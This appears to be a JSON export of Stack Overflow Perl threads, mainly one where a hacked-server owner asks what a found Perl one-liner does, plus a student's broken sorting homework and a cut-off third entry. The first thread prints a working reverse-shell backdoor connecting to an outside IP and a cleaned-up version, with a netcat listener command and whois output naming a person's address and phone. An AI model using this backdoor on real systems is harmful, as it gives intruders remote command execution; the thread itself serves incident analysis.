[{"tags": ["perl"], "comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 2, "creation_date": 1495048194, "post_id": 44032291, "comment_id": 75092439, "body": "Do a <code>whois 169.50.9.58</code> and contact the owner of that address block to report abuse."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1495053171, "post_id": 44032291, "comment_id": 75095232, "body": "You would do better if you took a step back and considered how others may view your question on first approach. <i>&quot;What does this perl program do?&quot;</i> is going to alienate many people, as it is a common prelude to a lazy question. I am surprised that your subject line wasn&#39;t rejected as a duplicate. If you make an effort to convey your predicament in the first few words then you would get far fewer close votes."}], "answers": [{"tags": [], "owner": {"reputation": 1787, "user_id": 1712449, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/PlwBV.gif?s=128&g=1", "display_name": "hymie", "link": "https://stackoverflow.com/users/1712449/hymie"}, "is_accepted": false, "score": 2, "last_activity_date": 1495047294, "last_edit_date": 1495047294, "creation_date": 1495046787, "answer_id": 44032643, "question_id": 44032291, "link": "https://stackoverflow.com/questions/44032291/what-does-this-nefarious-program-do/44032643#44032643", "title": "What does this nefarious program do?", "body": "<p>Short answer:</p>\n\n<pre><code>system$_ while&lt;&gt;;\n</code></pre>\n\n<p>basically means \"as long as there is input, execute the commands you get.\"</p>\n\n<p>If I run <code>nc -l -p 1212</code> on my machine, and then you run this script on your machine, then you open a connection to me where I can issue commands that your machine will run.</p>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 11, "last_activity_date": 1495091710, "last_edit_date": 1495091710, "creation_date": 1495048044, "answer_id": 44032958, "question_id": 44032291, "link": "https://stackoverflow.com/questions/44032291/what-does-this-nefarious-program-do/44032958#44032958", "title": "What does this nefarious program do?", "body": "<p>It opens a socket to that IP. Then it sets up the <code>STDIN</code> to read from it and the <code>STDOUT</code> to go to it.  So it builds a direct communication channel between the process and that IP.</p>\n\n<p>Then it goes into a <code>while</code> loop in which it runs via <code>system</code> whatever comes through <code>STDIN</code>.</p>\n\n<p>It does this in a forked process, fire-and-forget (detached) style, where the parent exits right away. So this executes and exits and there is <em>another</em> process that talks with that IP and runs commands.  </p>\n"}, {"comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1495050458, "post_id": 44033152, "comment_id": 75093679, "body": "Clever use of <code>$~</code> for golfing."}, {"owner": {"reputation": 281, "user_id": 7711597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wDhMT.jpg?s=128&g=1", "display_name": "davidvgalbraith", "link": "https://stackoverflow.com/users/7711597/davidvgalbraith"}, "edited": false, "score": 1, "creation_date": 1495051234, "post_id": 44033152, "comment_id": 75094168, "body": "The email account that you tried to reach does not exist. Please try double-checking the recipient&#39;s email address for typos or unnecessary spaces. Learn more at <a href=\"https://support.google.com/mail/?p=NoSuchUser\" rel=\"nofollow noreferrer\">support.google.com/mail/?p=NoSuchUser</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 281, "user_id": 7711597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wDhMT.jpg?s=128&g=1", "display_name": "davidvgalbraith", "link": "https://stackoverflow.com/users/7711597/davidvgalbraith"}, "edited": false, "score": 2, "creation_date": 1495051790, "post_id": 44033152, "comment_id": 75094538, "body": "@davidvgalbraith: Hmm. I would have thought that was probably illegal. The RAA requires that a contact for reports of abuse be maintained by everyone who registers a domain. There&#39;s a link on <a href=\"https://www.icann.org/resources/pages/abuse-2014-01-29-en\" rel=\"nofollow noreferrer\">ICANN Registrar Abuse Reports</a> labelled <b>If you have a complaint regarding a registrar failing to comply with these requirements</b>. Note that they have no authority over any abuse of their connection, only of the requirements of the registration."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "reply_to_user": {"reputation": 281, "user_id": 7711597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wDhMT.jpg?s=128&g=1", "display_name": "davidvgalbraith", "link": "https://stackoverflow.com/users/7711597/davidvgalbraith"}, "edited": false, "score": 1, "creation_date": 1495053435, "post_id": 44033152, "comment_id": 75095376, "body": "@davidvgalbraith Then call them. A machine with an IP they own is being used as a C&amp;C relay for bad stuff. See also <a href=\"http://blog.softlayer.com/2013/is-softlayer-spamming-me-how-to-report-abuse\" rel=\"nofollow noreferrer\">blog.softlayer.com/2013/&hellip;</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1495068573, "post_id": 44033152, "comment_id": 75100418, "body": "I&#39;m inclined to call <i>John Scharber</i> myself at <code>+1 866 398 7638</code>. It can&#39;t do any harm to publicise the misdemeanours being committed in his name, or to indicate that his abuse contact address is dead."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1495048845, "creation_date": 1495048845, "answer_id": 44033152, "question_id": 44032291, "link": "https://stackoverflow.com/questions/44032291/what-does-this-nefarious-program-do/44033152#44033152", "title": "What does this nefarious program do?", "body": "\n\n<p>That Perl code is equivalent to this</p>\n\n<p>You have already been told what it does; it's clearly malicious</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use IO;\n\n$p = fork;\nexit, if ( $p );\n\n$c = IO::Socket::INET-&gt;new( PeerAddr =&gt; \"169.50.9.58:1212\" );\nSTDIN-&gt;fdopen( $c, 'r' );\n$~-&gt;fdopen( $c, 'w' );\nsystem $_ while &lt;&gt;;\n</code></pre>\n\n<p>Here's the result of querying <a href=\"https://www.whois.com/\" rel=\"nofollow noreferrer\">whois.com</a> for that IP address. You may want to send an email to the \"abuse\" address</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>% This is the RIPE Database query service.\n% The objects are in RPSL format.\n%\n% The RIPE Database is subject to Terms and Conditions.\n% See http://www.ripe.net/db/support/db-terms-conditions.pdf\n\n% Note: this output has been filtered.\n%       To receive output for a database update, use the \"-B\" flag.\n\n% Information related to '169.50.9.32 - 169.50.9.63'\n\n% Abuse contact for '169.50.9.32 - 169.50.9.63' is 'email@softlayer.com'\n\ninetnum:        169.50.9.32 - 169.50.9.63\nnetname:        NETBLK-SOFTLAYER-RIPE-CUST-JS17702-RIPE\ndescr:          VidScale, Inc\ncountry:        US\nadmin-c:        JS17702-RIPE\ntech-c:         JS17702-RIPE\nstatus:         LEGACY\nmnt-by:         MAINT-SOFTLAYER-RIPE\ncreated:        2016-01-09T01:24:25Z\nlast-modified:  2016-01-09T01:24:25Z\nsource:         RIPE\n\nperson:         John Scharber\naddress:        4406 Whistling Wind Way\naddress:        Placerville, CA 95667 US\nphone:          +1.866.398.7638\nnic-hdl:        JS17702-RIPE\nabuse-mailbox:  email@vidscale.com\nmnt-by:         MAINT-SOFTLAYER-RIPE\ncreated:        2016-01-09T01:24:23Z\nlast-modified:  2016-01-09T01:24:23Z\nsource:         RIPE\n\n% This query was served by the RIPE Database Query Service version 1.88.1 (BLAARKOP)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "is_accepted": false, "score": 0, "last_activity_date": 1578037570, "creation_date": 1578037570, "answer_id": 59574912, "question_id": 44032291, "link": "https://stackoverflow.com/questions/44032291/what-does-this-nefarious-program-do/59574912#59574912", "title": "What does this nefarious program do?", "body": "<p>The other answers already adequately answer how this back door works. Just to recap, it allows an unprivileged user access to the system without authenticating. You only need to know which port number to connect to in order to run arbitrary programs on the computer.</p>\n\n<p>The reason this is \"nefarious\" is that it bypasses authentication. If it required you to log in with a valid user name and password, it would not be much different from a basic <code>telnet</code> server. (Granted, those are bad too; in today's world you would absolutely require <em>encrypted</em> authenticated access, i.e. <code>ssh</code> or similar.)</p>\n\n<p>A user who already has legitimate login access to your system has no need to run a program like this. They already have <code>ssh</code> access or similar.</p>\n\n<p>The reason intruders install such programs is often that it allows them to pivot from a simple vulnerability (like a simple \"Bobby Tables\" SQL injection) which only allows them to run a single command. Now they have interactive access and can conveniently run many commands without using (and potentially exposing) the original exploit again; from here, they can probably figure out a way to pivot further on to a privileged account (i.e. <code>root</code>), or initiate lateral movement to other systems within your perimeter.</p>\n"}], "owner": {"reputation": 281, "user_id": 7711597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wDhMT.jpg?s=128&g=1", "display_name": "davidvgalbraith", "link": "https://stackoverflow.com/users/7711597/davidvgalbraith"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 292, "favorite_count": 1, "accepted_answer_id": 44032958, "answer_count": 4, "score": 4, "last_activity_date": 1578037570, "creation_date": 1495045569, "last_edit_date": 1495051911, "question_id": 44032291, "link": "https://stackoverflow.com/questions/44032291/what-does-this-nefarious-program-do", "title": "What does this nefarious program do?", "body": "<p>My server got hacked, and <code>ps aux</code> shows that it's running this program now:</p>\n\n<pre><code>perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET (PeerAddr,\"169.50.9.58:1212\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;\n</code></pre>\n\n<p>I don't know Perl...what is this program doing?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 1, "user_id": 8020688, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f60dae88ec4f22eb72a607bc2ffa35fb?s=128&d=identicon&r=PG&f=1", "display_name": "Lily", "link": "https://stackoverflow.com/users/8020688/lily"}, "edited": false, "score": 0, "creation_date": 1495034004, "post_id": 44028229, "comment_id": 75083911, "body": "Hi Sobrique, Thank you so much for your edits! Unfortunately I&#39;m still getting naming and &quot;explicit package&quot; errors."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 5, "creation_date": 1495034163, "post_id": 44028229, "comment_id": 75084031, "body": "Yes, you will. I&#39;ve just reformatted your code for clarity and indentation, I haven&#39;t changed it&#39;s semantics. You&#39;re asking for someone to rewrite your code, and as it stands - it&#39;s not perl. Get to a point where it&#39;ll <i>actually compile</i> and you can explain what you don&#39;t understand and you&#39;ll have a better starting point for asking questions."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 4, "creation_date": 1495039852, "post_id": 44028229, "comment_id": 75087769, "body": "<i>&quot;my professor said I&#39;m close&quot;</i> Did they really? Well I can reassure you: you&#39;re really not. If you&#39;re supposed to have been learning Perl for a while then it looks like you&#39;ve absorbed pretty much nothing. You need to read your notes again thoroughly and start <i>understanding</i> what you&#39;re being told. You won&#39;t learn a thing if we do your homework for you."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1495102982, "post_id": 44028229, "comment_id": 75115579, "body": "If you care to actually understand this stuff and the class is not sufficient, you might want to buy a copy of the book <i>Learning Perl</i>. And as a word of advice from someone who trains developers as part of his job, please learn to communicate clearly. A big part of most technical jobs is to ask the right questions. Once you are the one being asked, you will see that it is very hard to answer them without sufficient knowledge about the problem or a crystal ball. Always include details. Always include input and output. Often the act oft trying to find the right words already solves the problem."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1495487741, "post_id": 44028229, "comment_id": 75263820, "body": "@simbabque: I didn&#39;t know you did training. No matter what people say about Perl&#39;s object-oriented facilities, I think it&#39;s the best language by far to teach OO principles. It provides all the tools you need to build an obiect-oriented structure without abstracting it all behind language concepts. I was a dreadful C++ programmer until I had done a few years of Perl, after which I understood what all that stuff <i>actually did</i>. It&#39;s a shame in a way that <code>Moose</code> was necessary, but in the spirit of making &quot;hard things possible&quot; it &#39;s pretty much essential."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1495489037, "post_id": 44028229, "comment_id": 75264308, "body": "@Borodin I train apprentices (the 3 year job training we have in Germany) for what is called <i>IT specialist/software development</i> (<i>Fachinformatiker/Anwendungsentwicklung</i>) and the language at <code>$work</code> is Perl. Others from around here have found me on the <code>$work</code> social media. That place says what else I do. ;) Anyway, I agree that the underlying concepts are very obvious with Perl&#39;s native OO. I read that very old book about them once, and it is essential I think. But Moose has its merits and I can&#39;t imagine working without it. It also feels very easy to grasp for trainees I have to say."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1495489874, "post_id": 44028229, "comment_id": 75264600, "body": "@simbabque: &quot;that very old book&quot;?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1495491382, "post_id": 44028229, "comment_id": 75265062, "body": "@Borodin <i>Object Oriented Perl</i> by Damian Conway. It was released in 1999. I consider that very old for a programming book. But it&#39;s still highly current."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1495495369, "post_id": 44028229, "comment_id": 75266129, "body": "@simbabque: I don&#39;t think I&#39;ve ever read that one, but I have a lot of respect for Conway."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 8020688, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f60dae88ec4f22eb72a607bc2ffa35fb?s=128&d=identicon&r=PG&f=1", "display_name": "Lily", "link": "https://stackoverflow.com/users/8020688/lily"}, "edited": false, "score": 0, "creation_date": 1495034639, "post_id": 44028700, "comment_id": 75084383, "body": "I see. I apologize for asking the question incorrectly! Perl is clearly new to me - I&#39;m sure this is supposed to be a simple/straightforward prompt but I&#39;m still confused by arrays."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 1, "user_id": 8020688, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f60dae88ec4f22eb72a607bc2ffa35fb?s=128&d=identicon&r=PG&f=1", "display_name": "Lily", "link": "https://stackoverflow.com/users/8020688/lily"}, "edited": false, "score": 1, "creation_date": 1495039183, "post_id": 44028700, "comment_id": 75087399, "body": "OK. Well, about the best i can offer is: Read through <a href=\"https://perldoc.perl.org/perldata.html\" rel=\"nofollow noreferrer\"><code>perldoc perldata</code></a> - and then ask another question about what you&#39;re having trouble understanding. If possible, give a sample code snippet that illustrates what you&#39;re having problems with."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 3, "creation_date": 1495039969, "post_id": 44028700, "comment_id": 75087843, "body": "<i>&quot;<code>ARGV</code> isn&#39;t anything&quot;</i>    <code>ARGV</code> is actually a filehandle."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 6, "last_activity_date": 1495039083, "last_edit_date": 1495039083, "creation_date": 1495033814, "answer_id": 44028700, "question_id": 44028229, "link": "https://stackoverflow.com/questions/44028229/alphabetize-in-perl/44028700#44028700", "title": "Alphabetize in Perl", "body": "<p>OK, look. Stack overflow isn't a 'fix my homework' site. </p>\n\n<p>Your code - it's not perl. <code>use strict;</code> <code>use warnings;</code> actually tells you what is wrong, but you've got <em>so many</em> errors it can be hard to follow.</p>\n\n<p>So - begin at the beginning:</p>\n\n<pre><code>#!/usr/bin/perl \nuse strict;\nuse warnings;\n\n# verify correct input and display error and quit if input is valid\n# (1) quit unless we have the correct number of command-line args\nmy $numargs = string $num_args = $#ARGV + 1;\n</code></pre>\n\n<p>What did you <em>intend</em> this to mean? Because it errors with <em>just</em> this line already, so you can stop there and not bother looking at the rest of your code (for now, but it has more errors). </p>\n\n<p>You:</p>\n\n<ul>\n<li>declare <code>$numargs</code> using <code>my</code>. </li>\n<li>then you use a function called <code>string</code> (which doesn't exist) on a variable called <code>$num_args</code> - which also doesn't exist. </li>\n</ul>\n\n<p>Perhaps you meant:</p>\n\n<pre><code>my $num_args = @ARGV;\n</code></pre>\n\n<p>Or you could just use <code>@ARGV</code> in a scalar context whenever you need <code>$num_args</code>. </p>\n\n<p>But there's further problems with your code, that suggest you don't really understand:</p>\n\n<ul>\n<li>Semicolons are statement separators. End of each line, typically. You're missing a bunch. </li>\n</ul>\n\n<p>That means as far as perl is concerned:</p>\n\n<pre><code> my $num_args eq string\n   print \"Enter multiple random strings of letters, separated by spaces: \";\n</code></pre>\n\n<p>is a single line of code:</p>\n\n<pre><code>my $num_args eq string print \"Enter multiple random strings of letters, separated by spaces: \";\n</code></pre>\n\n<p>Which doesn't make a lot of sense. </p>\n\n<ul>\n<li><code>$</code> denotes a scalar variable. <code>@</code> an array. But <code>perl</code> automagically knows the difference between \"string\" and \"number\" when you operate on it. <code>$string</code> and <code>@string</code> are not the same thing. They're completely different variables (but confusingly named, so don't do that). </li>\n<li>Context is important. If you use <code>@ARGV</code> in a <em>scalar</em> context (e.g. as if it's a single value) it will return the numeric count of number of entries.  See: <a href=\"https://perldoc.perl.org/perldata.html#Context\" rel=\"nofollow noreferrer\">perldata context</a></li>\n<li><code>ARGV</code> isn't anything. <code>@ARGV</code> is an array containing the values of the command line arguments. See: <a href=\"http://perldoc.perl.org/perlvar.html\" rel=\"nofollow noreferrer\">perlvar</a></li>\n<li>Barewords aren't cool. Quote things that are supposed to be strings. If they're functions/subroutines make sure they exist - <code>string</code> doesn't, because perl doesn't actually have a \"string\" type - it has has scalars.  (See <a href=\"https://perldoc.perl.org/perldata.html\" rel=\"nofollow noreferrer\">perldata</a></li>\n<li>You have a logic error I think. You test for <code>$num_args != 2</code> and exit - so ... basically can only ever have two arguments to your code. That's at odds with  your comment. </li>\n</ul>\n\n<p>I'm not going to give you the answer (you'll probably get marked down, because your professor can google too), but as a hint - you can just operate on <code>@ARGV</code> and given your spec, can have about one line of <em>actual code</em> to do what you want. (Two maybe, if you want to give a message about lack of input too)</p>\n\n<p>So backtrack a bit. Think about what you're <em>actually</em> trying to do. You know your 'arbitrary string from command line' is <code>@ARGV</code>. </p>\n"}, {"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1495101393, "post_id": 44044425, "comment_id": 75114514, "body": "If <code>eq</code> is equivalent (no pun intended) to <code>==</code> for strings, maybe we should push for <code>e</code> as a new assignment operator for strings in equivalent to <code>=</code>. Would make for more fun in obfuscation contests..."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1495101509, "post_id": 44044425, "comment_id": 75114607, "body": "@simbabque I was once told on LinkedIn that &quot;eq&quot; was Perl&#39;s string assignment operator. I&#39;m convinced that the person who told me this was serious, but I have no idea how any of his code ever worked."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1495101628, "post_id": 44044425, "comment_id": 75114673, "body": "Ouch. I see. Maybe that person is now a teacher at OP&#39;s university? On a different note, your solution doesn&#39;t need the <code>foreach</code> because <code>print</code> is fine with a list, but it might need a <code>say</code> or a <code>join &#39; &#39;,</code> or setting <code>$,</code> because since we&#39;re sorting command line args, there are no newlines in the input, and everything comes back as one long sorted string without separators."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1495101746, "post_id": 44044425, "comment_id": 75114746, "body": "Yeah. I meant <code>say</code> instead of <code>print</code>. But as I was typing I realised there was a good chance the OP was using a Perl without <code>say</code>. But now I realise I don&#39;t care."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 1, "last_activity_date": 1495101687, "last_edit_date": 1495101687, "creation_date": 1495101156, "answer_id": 44044425, "question_id": 44028229, "link": "https://stackoverflow.com/questions/44028229/alphabetize-in-perl/44044425#44044425", "title": "Alphabetize in Perl", "body": "<p>Your code has the look of someone who is trying random things in the hope that one of them will work.</p>\n\n<pre><code>if ( $num_args != 2 ) {\n  exit;\n}\n</code></pre>\n\n<p>This is valid Perl. It will exit your program if <code>$num_args</code> doesn't equal 2. But your definition of the problem told you to write \"a Perl program that reads in an arbitrary number of strings\". So why exit if you're not given exactly two strings?</p>\n\n<pre><code>if ( $num_args &gt; 2 ) {\n  my $num_args eq string\n  print \"Enter multiple random strings of letters, separated by spaces: \";\n  exit;\n}\n</code></pre>\n\n<p>This doesn't compile. I think you're missing a semicolon at the end of <code>my $num_args eq string</code>. But even then it makes no sense. What do you think <code>string</code> is? And <code>eq</code> is a comparison operator - you might be trying to use it for assignment here.</p>\n\n<p>But, above that, it makes no logical sense. In the previous section, you exited the program if <code>$num_args</code> wasn't equal to 2. And now you're checking to see if <code>$num_args</code> is greater than 2. The only possible value that <code>$num_args</code> can have at this point is 2. And 2 is never going to be greater than 2.</p>\n\n<pre><code>my @string = ARGV\n\nif ( $string eq ARGV ) {\n  my $string = ARGV;\n}\n</code></pre>\n\n<p>Something else that can't even compile. There's another semicolon missing and <code>ARGV</code> is a filehandle, not the array you seems to think it is.</p>\n\n<p>You need to step back and take a closer look at the question. And think logically about the solution. Programming is about breaking problems down into smaller steps. If you find yourself typing stuff at random in the hope that something will work, then it's time to take some time off. Go for a walk around the block to clear your head.</p>\n\n<p>Perl's mission is to make jobs like this simple. The code that solves your problem is a single line.</p>\n\n<pre><code>say foreach sort @ARGV;\n</code></pre>\n\n<p>But please don't submit that as your solution unless you can explain how it works.</p>\n"}], "owner": {"reputation": 1, "user_id": 8020688, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f60dae88ec4f22eb72a607bc2ffa35fb?s=128&d=identicon&r=PG&f=1", "display_name": "Lily", "link": "https://stackoverflow.com/users/8020688/lily"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 254, "favorite_count": 1, "answer_count": 2, "score": -5, "last_activity_date": 1495101687, "creation_date": 1495032593, "last_edit_date": 1495037683, "question_id": 44028229, "link": "https://stackoverflow.com/questions/44028229/alphabetize-in-perl", "title": "Alphabetize in Perl", "body": "<p>here is the prompt I have: Write a Perl program that reads in an arbitrary number of strings from the command line and\ndisplays them sorted alphabetically. Here's what I have:</p>\n\n<pre><code>#!/usr/bin/perl \nuse strict;\nuse warnings;\n\n# read command line arguments\n\n\n# verify correct input and display error and quit if input is valid\n# (1) quit unless we have the correct number of command-line args\nmy $numargs = string $num_args = $#ARGV + 1;\nif ( $num_args != 2 ) {\n\n   exit;\n}\nif ( $num_args &gt; 2 ) {\n   my $num_args eq string\n     print \"Enter multiple random strings of letters, separated by spaces: \";\n   exit;\n}\n\n\n# (2) If we get multiple command arguments, assume they are\n# separate strings of random letters\nmy @string = ARGV\n\n  if ( $string eq ARGV ) {\n   my $string = ARGV;\n}\n\n\n# sort strings\nmy @sorted_string = sort @string;\n\n# display sorted string\n\nprint \"Here is your sorted list: \"@sorted_string \"\\n\";\n</code></pre>\n\n<p>The errors I'm getting is about naming, but my professor said I'm close. Any help is much appreciated!</p>\n"}, {"tags": ["mysql", "database", "perl", "locking", "myisam"], "comments": [{"owner": 